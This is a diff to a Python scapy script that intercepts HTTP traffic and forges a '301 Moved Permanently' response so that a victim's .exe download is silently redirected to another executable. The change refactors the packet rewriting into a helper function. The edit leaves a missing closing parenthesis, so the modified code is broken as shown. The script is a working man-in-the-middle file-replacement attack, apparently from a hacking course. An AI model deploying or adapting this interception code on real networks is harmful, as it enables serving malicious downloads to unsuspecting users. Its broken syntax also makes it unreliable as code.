@@ -3,6 +3,13 @@ import scapy.all as scapy
 
 ack_list = []
 
+def set_load(packet, load):
+    packet[scapy.RAW].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
@@ -14,12 +21,10 @@ def process_packet(packet):
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print("[+] Replacing file")
-                scapy_packet[scapy.RAW].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n" # redirects to new .exe file url
-                del scapy_packet[scapy.IP].len
-                del scapy_packet[scapy.IP].chksum
-                del scapy_packet[scapy.TCP].chksum
-                packet.set_payload(str(scapy_packet))
+                print("[+] Replacing file")                                                         # redirects to new .exe file url)
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n" 
+
+                packet.set_payload(str(modified_packet))
 
     packet.accept()
 
